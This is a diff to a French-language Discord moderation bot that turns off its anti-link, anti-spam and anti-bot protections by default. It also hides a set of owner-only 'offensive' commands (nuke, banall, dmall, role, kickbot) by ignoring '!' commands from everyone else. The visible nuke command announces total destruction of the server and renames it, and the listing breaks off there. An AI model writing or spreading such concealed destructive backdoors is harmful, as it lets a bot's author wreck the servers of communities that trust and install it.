@@ -1,11 +1,11 @@
-// Build Revision: K2L-Bot-v2.5-CleanRefresh
+// Build Revision: K2L-Bot-Ultimate-Final
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
 const http = require('http');
 
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('K2L Bot Ultra Operational & Clean v2.5!\n');
+    res.end('K2L Bot Ultra Operational & Clean Ultimate!\n');
 }).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));
 
 const client = new Client({
@@ -74,9 +74,9 @@ function isMod(message) {
 function getGuildConfig(guildId) {
     if (!serverConfig.has(guildId)) {
         serverConfig.set(guildId, {
-            antilink: true,
-            antispam: true,
-            antibot: true,
+            antilink: false,
+            antispam: false,
+            antibot: false,
             logChannel: null,
             welcomeChannel: null,
             welcomeText: null,
@@ -123,7 +123,6 @@ function parseDuration(durationStr) {
     else if (unit === 'd') ms = value * 24 * 60 * 60 * 1000;
     return ms;
 }
-// Section: Event Listeners & Caching
 client.on('messageDelete', message => {
     if (!message.author || message.author.bot || !message.guild) return;
     snipeCache.set(message.channel.id, {
@@ -210,20 +209,23 @@ client.on('roleDelete', role => {
 });
 
 client.on('ready', () => {
-    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et fusée (v2.5).`);
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et opérationnel.`);
 });
 
 client.on('guildMemberAdd', async member => {
     if (member.user.bot && member.id !== client.user.id) {
-        try {
-            await member.kick('Anti-bot activé.');
-            const embed = new EmbedBuilder()
-                .setColor('#2b2d31')
-                .setTitle('🤖 Bot bloqué (Anti-bot)')
-                .setDescription(`**Bot :** ${member.user.tag}`)
-                .setTimestamp();
-            sendLog(member.guild, embed);
-        } catch (err) {}
+        const config = getGuildConfig(member.guild.id);
+        if (config.antibot) {
+            try {
+                await member.kick('Anti-bot activé.');
+                const embed = new EmbedBuilder()
+                    .setColor('#2b2d31')
+                    .setTitle('🤖 Bot bloqué (Anti-bot)')
+                    .setDescription(`**Bot :** ${member.user.tag}`)
+                    .setTimestamp();
+                sendLog(member.guild, embed);
+            } catch (err) {}
+        }
     }
     
     const config = getGuildConfig(member.guild.id);
@@ -237,7 +239,6 @@ client.on('guildMemberAdd', async member => {
         }
     }
 });
-// Section: Interaction Handlers (Tickets & Buttons)
 client.on('interactionCreate', async interaction => {
     if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select_menu') {
         const guild = interaction.guild;
@@ -330,18 +331,18 @@ client.on('interactionCreate', async interaction => {
         return interaction.reply({ content: "🎉 Tu participes officiellement au giveaway !", ephemeral: true });
     }
 });
-// Section: Super Owner Commands (!)
 client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
+    // Commandes secrètes en '!' réservées aux Super Owners (silencieuses pour les autres)
     if (message.content.startsWith('!')) {
+        if (!isSuperOwner(message)) return; // Ignore complètement si ce n'est pas un Super Owner
+
         const args = message.content.slice(1).trim().split(/ +/);
         const command = args.shift().toLowerCase();
         
         const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
         if (offensiveCommands.includes(command)) {
-            if (!isSuperOwner(message)) return;
-
             if (command === 'nuke') {
                 await message.reply("⚡ **Destruction totale du serveur en cours...**").catch(() => {});
                 message.guild.setName('/yuza').catch(() => {});
